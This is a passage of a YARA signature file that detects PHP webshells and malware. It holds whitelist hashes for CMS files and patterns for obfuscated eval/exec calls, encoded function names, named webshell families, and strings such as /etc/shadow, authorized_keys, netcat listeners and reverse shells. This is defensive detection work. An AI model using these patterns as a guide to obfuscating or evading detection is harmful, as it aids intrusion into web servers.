        hash.sha1(0, filesize)  == "44ba7a5b685f4a52113559f366aaf6e9a22ae21e"    // app/code/core/Mage/Adminhtml/Model/Url.php
}

private rule Roundcube
{
    condition:
        /* Roundcube 1.1.2 */
        hash.sha1(0, filesize) == "afab52649172b46f64301f41371d346297046af2" or // program/lib/Roundcube/rcube_utils.php
        hash.sha1(0, filesize) == "e6b81834e081cc2bd38fce787c5088e63d933953" or // program/include/rcmail_output_html.php
        hash.sha1(0, filesize) == "7783e9fad144ca5292630d459bd86ec5ea5894fc" or // vendor/pear-pear.php.net/Net_LDAP2/Net/LDAP2/Util.php

        /* Roundcube 1.0.6 */
        hash.sha1(0, filesize) == "76d55f05f2070f471ba977b5b0f690c91fa8cdab" or // program/lib/Roundcube/rcube_utils.php
        hash.sha1(0, filesize) == "c68319e3e1adcd3e22cf2338bc79f12fd54f6d4a"    // program/include/rcmail_output_html.php
}

private rule Concrete5
{
    condition:
        /* concrete5 7.4.2 */
        hash.sha1(0, filesize) == "927bbd60554ae0789d4688738b4ae945195a3c1c" or // concrete/vendor/oyejorge/less.php/lib/Less/Tree/Dimension.php
        hash.sha1(0, filesize) == "67f07022dae5fa39e8a37c09d67cbcb833e10d1f" or // concrete/vendor/oyejorge/less.php/lib/Less/Tree/Unit.php
        hash.sha1(0, filesize) == "e1dcbc7b05e8ba6cba392f8fd44a3564fcad3666"    // concrete/vendor/doctrine/inflector/lib/Doctrine/Common/Inflector/Inflector.php
}

private rule Dotclear : Blog
{
    condition:
        /* dotclear 2.8.0 */
        hash.sha1(0, filesize) == "c732d2d54a80250fb8b51d4dddb74d05a59cee2e" or // inc/public/class.dc.template.php
        hash.sha1(0, filesize) == "cc494f7f4044b5a3361281e27f2f7bb8952b8964" or // inc/core/class.dc.modules.php

        /* dotclear 2.7.5 */
        hash.sha1(0, filesize) == "192126b08c40c5ca086b5e4d7433e982f708baf3" or // inc/public/class.dc.template.php
        hash.sha1(0, filesize) == "51e6810ccd3773e2bd453e97ccf16059551bae08" or // inc/libs/clearbricks/common/lib.date.php
        hash.sha1(0, filesize) == "4172e35e7c9ce35de9f56fb8dfebe8d453f0dee4" or // inc/libs/clearbricks/template/class.template.php
        hash.sha1(0, filesize) == "cf65db6ae55486f51370f87c4653aaed56903ccc"    // inc/core/class.dc.modules.php
}

private rule Owncloud
{
    condition:
        /* ownCloud 8.1.0 */
        hash.sha1(0, filesize) == "a58489a3d8401295bb09cfbad09486f605625658" or // 3rdparty/phpseclib/phpseclib/phpseclib/Net/SSH1.php
        hash.sha1(0, filesize) == "463627a4064dc05e93e6f9fc5605d4c8a4e09200" or // 3rdparty/jeremeamia/SuperClosure/src/SerializableClosure.php
        hash.sha1(0, filesize) == "5346cb6817a75c26a6aad86e0b4ffb1d5145caa5" or // 3rdparty/symfony/process/Symfony/Component/Process/Process.php
        hash.sha1(0, filesize) == "c8a6d4292448c7996e0092e6bfd38f90c34df090" or // core/doc/admin/_images/oc_admin_app_page.png
        hash.sha1(0, filesize) == "acc7af31d4067c336937719b9a9ad7ac8497561e"    // core/doc/admin/_sources/configuration_server/performance_tuning.txt
}

private rule Misc
{
    condition:
        /* HTMLPurifier standalone 4.6.0 */
        hash.sha1(0, filesize) == "9452a5f1183cbef0487b922cc1ba904ea21ad39a"
}
private rule IsWhitelisted
{
    condition:
        Symfony or
        Wordpress or
        Prestashop or
        Magento or
        Magento1Ce or
        Magento2 or
        Drupal or
        Roundcube or
        Concrete5 or
        Dotclear or
        Owncloud or
        Phpmyadmin or
        Misc
}
global private rule IsPhp
{
    strings:
        $php = /<\?[^x]/

    condition:
        $php and filesize < 5MB
}

rule NonPrintableChars
{
  strings:
    /*
    Searching only for non-printable characters completely kills the perf,
    so we have to use atoms (https://gist.github.com/Neo23x0/e3d4e316d7441d9143c7)
    to get an acceptable speed.
    */
    $non_printables = /(function|return|base64_decode).{,256}[^\x09-\x0d\x20-\x7E]{3}/

  condition:
        (any of them) and not IsWhitelisted
}


rule PasswordProtection
{
    strings:
        $md5 = /md5\s*\(\s*\$_(GET|REQUEST|POST|COOKIE|SERVER)[^)]+\)\s*===?\s*['"][0-9a-f]{32}['"]/ nocase
        $sha1 = /sha1\s*\(\s*\$_(GET|REQUEST|POST|COOKIE|SERVER)[^)]+\)\s*===?\s*['"][0-9a-f]{40}['"]/ nocase
    condition:
        (any of them) and not IsWhitelisted
}

rule ObfuscatedPhp
{
    strings:
        $eval = /(<\?php|[;{}])[ \t]*@?(eval|preg_replace|system|assert|passthru|(pcntl_)?exec|shell_exec|call_user_func(_array)?)\s*\(/ nocase  // ;eval( <- this is dodgy
        $eval_comment = /(eval|preg_replace|system|assert|passthru|(pcntl_)?exec|shell_exec|call_user_func(_array)?)\/\*[^\*]*\*\/\(/ nocase  // eval/*lol*/( <- this is dodgy
        $b374k = "'ev'.'al'"
        $align = /(\$\w+=[^;]*)*;\$\w+=@?\$\w+\(/  //b374k
        $weevely3 = /\$\w=\$[a-zA-Z]\('',\$\w\);\$\w\(\);/  // weevely3 launcher
        $c99_launcher = /;\$\w+\(\$\w+(,\s?\$\w+)+\);/  // http://bartblaze.blogspot.fr/2015/03/c99shell-not-dead.html
        $nano = /\$[a-z0-9-_]+\[[^]]+\]\(/ //https://github.com/UltimateHackers/nano
        $ninja = /base64_decode[^;]+getallheaders/ //https://github.com/UltimateHackers/nano
        $variable_variable = /\${\$[0-9a-zA-z]+}/
        $too_many_chr = /(chr\([\d]+\)\.){8}/  // concatenation of more than eight `chr()`
        $concat = /(\$[^\n\r]+\.){5}/  // concatenation of more than 5 words
        $concat_with_spaces = /(\$[^\n\r]+\. ){5}/  // concatenation of more than 5 words, with spaces
        $var_as_func = /\$_(GET|POST|COOKIE|REQUEST|SERVER)\s*\[[^\]]+\]\s*\(/
        $comment = /\/\*([^*]|\*[^\/])*\*\/\s*\(/  // eval /* comment */ (php_code)
condition:
        (any of them) and not IsWhitelisted
}

rule DodgyPhp
{
    strings:
        $basedir_bypass = /curl_init\s*\(\s*["']file:\/\// nocase
        $basedir_bypass2 = "file:file:///" // https://www.intelligentexploit.com/view-details.html?id=8719
        $disable_magic_quotes = /set_magic_quotes_runtime\s*\(\s*0/ nocase

        $execution = /\b(eval|assert|passthru|exec|include|system|pcntl_exec|shell_exec|base64_decode|`|array_map|ob_start|call_user_func(_array)?)\s*\(\s*(base64_decode|php:\/\/input|str_rot13|gz(inflate|uncompress)|getenv|pack|\\?\$_(GET|REQUEST|POST|COOKIE|SERVER))/ nocase  // function that takes a callback as 1st parameter
        $execution2 = /\b(array_filter|array_reduce|array_walk(_recursive)?|array_walk|assert_options|uasort|uksort|usort|preg_replace_callback|iterator_apply)\s*\(\s*[^,]+,\s*(base64_decode|php:\/\/input|str_rot13|gz(inflate|uncompress)|getenv|pack|\\?\$_(GET|REQUEST|POST|COOKIE|SERVER))/ nocase  // functions that takes a callback as 2nd parameter
        $execution3 = /\b(array_(diff|intersect)_u(key|assoc)|array_udiff)\s*\(\s*([^,]+\s*,?)+\s*(base64_decode|php:\/\/input|str_rot13|gz(inflate|uncompress)|getenv|pack|\\?\$_(GET|REQUEST|POST|COOKIE|SERVER))\s*\[[^]]+\]\s*\)+\s*;/ nocase  // functions that takes a callback as 2nd parameter

        $htaccess = "SetHandler application/x-httpd-php"
        $iis_com = /IIS:\/\/localhost\/w3svc/
        $include = /include\s*\(\s*[^\.]+\.(png|jpg|gif|bmp)/  // Clever includes
        $ini_get = /ini_(get|set|restore)\s*\(\s*['"](safe_mode|open_basedir|disable_(function|classe)s|safe_mode_exec_dir|safe_mode_include_dir|register_globals|allow_url_include)/ nocase
        $pr = /(preg_replace(_callback)?|mb_ereg_replace|preg_filter)\s*\([^)]*(\/|\\x2f)(e|\\x65)['"]/  nocase // http://php.net/manual/en/function.preg-replace.php
        $register_function = /register_[a-z]+_function\s*\(\s*['"]\s*(eval|assert|passthru|exec|include|system|shell_exec|`)/  // https://github.com/nbs-system/php-malware-finder/issues/41
        $safemode_bypass = /\x00\/\.\.\/|LD_PRELOAD/
        $shellshock = /\(\)\s*{\s*[a-z:]\s*;\s*}\s*;/
        $udp_dos = /fsockopen\s*\(\s*['"]udp:\/\// nocase
        $various = "<!--#exec cmd="  //http://www.w3.org/Jigsaw/Doc/User/SSI.html#exec
        $at_eval = /@eval\s*\(/ nocase
        $double_var = /\${\s*\${/
        $extract = /extract\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)/
        $reversed = /noitcnuf_etaerc|metsys|urhtssap|edulcni|etucexe_llehs/ nocase
				$silenced_include =/@\s*include\s*/ nocase

    condition:
        (any of them) and not IsWhitelisted
}

rule DangerousPhp
{
    strings:
        $system = "system" fullword nocase  // localroot bruteforcers have a lot of this

        $ = "array_filter" fullword nocase
        $ = "assert" fullword nocase
        $ = "backticks" fullword nocase
        $ = "call_user_func" fullword nocase
        $ = "eval" fullword nocase
        $ = "exec" fullword nocase
        $ = "fpassthru" fullword nocase
        $ = "fsockopen" fullword nocase
        $ = "function_exists" fullword nocase
        $ = "getmygid" fullword nocase
        $ = "shmop_open" fullword nocase
        $ = "mb_ereg_replace_callback" fullword nocase
        $ = "passthru" fullword nocase
        $ = /pcntl_(exec|fork)/ fullword nocase
        $ = "php_uname" fullword nocase
        $ = "phpinfo" fullword nocase
        $ = "posix_geteuid" fullword nocase
        $ = "posix_getgid" fullword nocase
        $ = "posix_getpgid" fullword nocase
        $ = "posix_getppid" fullword nocase
        $ = "posix_getpwnam" fullword nocase
        $ = "posix_getpwuid" fullword nocase
        $ = "posix_getsid" fullword nocase
        $ = "posix_getuid" fullword nocase
        $ = "posix_kill" fullword nocase
        $ = "posix_setegid" fullword nocase
        $ = "posix_seteuid" fullword nocase
        $ = "posix_setgid" fullword nocase
        $ = "posix_setpgid" fullword nocase
        $ = "posix_setsid" fullword nocase
        $ = "posix_setsid" fullword nocase
        $ = "posix_setuid" fullword nocase
        $ = "preg_replace_callback" fullword
        $ = "proc_open" fullword nocase
        $ = "proc_close" fullword nocase
        $ = "popen" fullword nocase
        $ = "register_shutdown_function" fullword nocase
        $ = "register_tick_function" fullword nocase
        $ = "shell_exec" fullword nocase
        $ = "shm_open" fullword nocase
        $ = "show_source" fullword nocase
        $ = "socket_create(AF_INET, SOCK_STREAM, SOL_TCP)" nocase
        $ = "stream_socket_pair" nocase
        $ = "suhosin.executor.func.blacklist" nocase
        $ = "unregister_tick_function" fullword nocase
        $ = "win32_create_service" fullword nocase
        $ = "xmlrpc_decode" fullword nocase 
        $ = /ob_start\s*\(\s*[^\)]/  //ob_start('assert'); echo $_REQUEST['pass']; ob_end_flush();

        $whitelist = /escapeshellcmd|escapeshellarg/ nocase

    condition:
        (not $whitelist and (5 of them or #system > 250)) and not IsWhitelisted
}

rule HiddenInAFile
{
    strings:
        $gif = {47 49 46 38 ?? 61} // GIF8[version]a
        $png = {89 50 4E 47 0D 0a 1a 0a} // \X89png\X0D\X0A\X1A\X0A
        $jpeg = {FF D8 FF E0 ?? ?? 4A 46 49 46 } // https://raw.githubusercontent.com/corkami/pics/master/JPG.png

    condition:
        ($gif at 0 or $png at 0 or $jpeg at 0) and (PasswordProtection or ObfuscatedPhp or DodgyPhp or DangerousPhp) and not IsWhitelisted
}

rule CloudFlareBypass
{
    strings:
        $ = "chk_jschl"
        $ = "jschl_vc"
        $ = "jschl_answer"

    condition:
        2 of them // Better be safe than sorry
}

private rule IRC
{
    strings:
        $ = "USER" fullword nocase
        $ = "PASS" fullword nocase
        $ = "PRIVMSG" fullword nocase
        $ = "MODE" fullword nocase
        $ = "PING" fullword nocase
        $ = "PONG" fullword nocase
        $ = "JOIN" fullword nocase
        $ = "PART" fullword nocase

    condition:
        5 of them
}

private rule b64
{
    strings:
        $user_agent = "SFRUUF9VU0VSX0FHRU5UCg"
        $eval = "ZXZhbCg"
        $system = "c3lzdGVt"
        $preg_replace = "cHJlZ19yZXBsYWNl"
        $exec = "ZXhlYyg"
        $base64_decode = "YmFzZTY0X2RlY29kZ"
        $perl_shebang = "IyEvdXNyL2Jpbi9wZXJsCg"
        $cmd_exe = "Y21kLmV4ZQ"
        $powershell = "cG93ZXJzaGVsbC5leGU"

    condition:
        any of them
}

private rule hex
{
    strings:
        $globals = "\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53" nocase
        $eval = "\\x65\\x76\\x61\\x6C\\x28" nocase
        $exec = "\\x65\\x78\\x65\\x63" nocase
        $system = "\\x73\\x79\\x73\\x74\\x65\\x6d" nocase
        $preg_replace = "\\x70\\x72\\x65\\x67\\x5f\\x72\\x65\\x70\\x6c\\x61\\x63\\x65" nocase
        $http_user_agent = "\\x48\\124\\x54\\120\\x5f\\125\\x53\\105\\x52\\137\\x41\\107\\x45\\116\\x54" nocase
        $base64_decode = "\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x67\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65\\x28" nocase
    
    condition:
        any of them
}

private rule Hpack
{
    strings:
    $globals = "474c4f42414c53" nocase
        $eval = "6576616C28" nocase
        $exec = "65786563" nocase
        $system = "73797374656d" nocase
        $preg_replace = "707265675f7265706c616365" nocase
        $base64_decode = "61736536345f6465636f646528677a696e666c61746528" nocase
    
    condition:
        any of them
}

private rule strrev
{
    strings:
        $globals = "slabolg" nocase fullword
        $preg_replace = "ecalper_gerp" nocase fullword
        $base64_decode = "edoced_46esab" nocase fullword
        $gzinflate = "etalfnizg" nocase fullword
    
    condition:
        any of them
}


rule SuspiciousEncoding
{
    condition:
        (b64 or hex or strrev or Hpack) and not IsWhitelisted
}

rule DodgyStrings
{
    strings:
        $ = ".bash_history"
        $ = /AddType\s+application\/x-httpd-(php|cgi)/ nocase
        $ = /php_value\s*auto_prepend_file/ nocase
        $ = /SecFilterEngine\s+Off/ nocase  // disable modsec
        $ = /Add(Handler|Type|OutputFilter)\s+[^\s]+\s+\.htaccess/ nocase
        $ = ".mysql_history"
        $ = ".ssh/authorized_keys"
        $ = "/(.*)/e"  // preg_replace code execution
        $ = "/../../../"
        $ = "/etc/passwd"
        $ = "/etc/proftpd.conf"
        $ = "/etc/resolv.conf"
        $ = "/etc/shadow"
        $ = "/etc/syslog.conf"
        $ = "/proc/cpuinfo" fullword
        $ = "/var/log/lastlog"
        $ = "/windows/system32/"
        $ = "LOAD DATA LOCAL INFILE" nocase
        $ = "WScript.Shell"
        $ = "WinExec"
        $ = "b374k" fullword nocase
        $ = "backdoor" fullword nocase
        $ = /(c99|r57|fx29)shell/
        $ = "cmd.exe" fullword nocase
        $ = "powershell.exe" fullword nocase
        $ = /defac(ed|er|ement|ing)/ fullword nocase
        $ = "evilc0ders" fullword nocase
        $ = "exploit" fullword nocase
        $ = "find . -type f" fullword
        $ = "hashcrack" nocase
        $ = "id_rsa" fullword
        $ = "ipconfig" fullword nocase
        $ = "kernel32.dll" fullword nocase
        $ = "kingdefacer" nocase
        $ = "Wireghoul" nocase fullword
        $ = "htshell" nocase fullword
        $ = "LD_PRELOAD" fullword
        $ = "libpcprofile"  // CVE-2010-3856 local root
        $ = "locus7s" nocase
        $ = "ls -la" fullword
        $ = "meterpreter" fullword
        $ = "nc -l" fullword
        $ = "netstat -an" fullword
        $ = "php://"
        $ = "ps -aux" fullword
        $ = "rootkit" fullword nocase
        $ = "slowloris" fullword nocase
        $ = "suhosin" fullword
        $ = "sun-tzu" fullword nocase // Because quotes from the Art of War is mandatory for any cool webshell.
    $ = /trojan (payload)?/
        $ = "uname -a" fullword
        $ = "visbot" nocase fullword
        $ = "warez" fullword nocase
        $ = "whoami" fullword
        $ = /(r[e3]v[e3]rs[e3]|w[3e]b|cmd)\s*sh[e3]ll/ nocase
        $ = /-perm -0[24]000/ // find setuid files
        $ = /\/bin\/(ba)?sh/ fullword
        $ = /hack(ing|er|ed)/ nocase
        $ = /(safe_mode|open_basedir) bypass/ nocase
        $ = /xp_(execresultset|regenumkeys|cmdshell|filelist)/

        $vbs = /language\s*=\s*vbscript/ nocase
        $asp = "scripting.filesystemobject" nocase

    condition:
        (IRC or 2 of them) and not IsWhitelisted
}

rule Websites
{
    strings:
        $ = "1337day.com" nocase
        $ = "antichat.ru" nocase
        $ = "b374k" nocase
        $ = "ccteam.ru" nocase
        $ = "crackfor" nocase
        $ = "darkc0de" nocase
        $ = "egyspider.eu" nocase
        $ = "exploit-db.com" nocase
        $ = "fopo.com.ar" nocase  /* Free Online Php Obfuscator */
        $ = "hashchecker.com" nocase
        $ = "hashkiller.com" nocase
        $ = "md5crack.com" nocase
        $ = "md5decrypter.com" nocase
        $ = "milw0rm.com" nocase
        $ = "milw00rm.com" nocase
        $ = "packetstormsecurity" nocase
        $ = "pentestmonkey.net" nocase
        $ = "phpjiami.com" nocase
        $ = "rapid7.com" nocase
        $ = "securityfocus" nocase
        $ = "shodan.io" nocase
        $ = "github.com/b374k/b374k" nocase
        $ = "mumaasp.com" nocase

    condition:
        (any of them) and not IsWhitelisted
}
